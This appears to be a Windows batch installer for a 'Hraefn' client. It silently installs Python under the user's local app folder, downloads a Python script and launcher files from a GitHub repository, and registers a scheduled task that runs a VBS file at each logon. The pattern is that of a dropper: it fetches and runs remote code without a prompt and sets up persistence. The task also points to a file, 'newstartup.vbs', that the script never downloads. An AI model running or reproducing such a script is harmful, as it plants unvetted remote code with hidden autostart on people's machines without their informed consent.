@ECHO OFF
cd %LocalAppData%
mkdir Programs
cd Pro*
curl https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe -o python-3.10.8-amd64.exe
python-3.10.8-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
curl -LJO https://github.com/Maninthebath/Hraefn/raw/main/Client_Install/Urd.py
curl -LJO https://github.com/Maninthebath/Hraefn/raw/main/Client_Install/Urd_batstart.vbs
curl -LJO https://github.com/Maninthebath/Hraefn/raw/main/Client_Install/Urdstart.bat
schtasks /CREATE /TN "Hraefn" /TR "cscript.exe '%LocalAppData%\Programs\newstartup.vbs'" /SC ONLOGON /IT
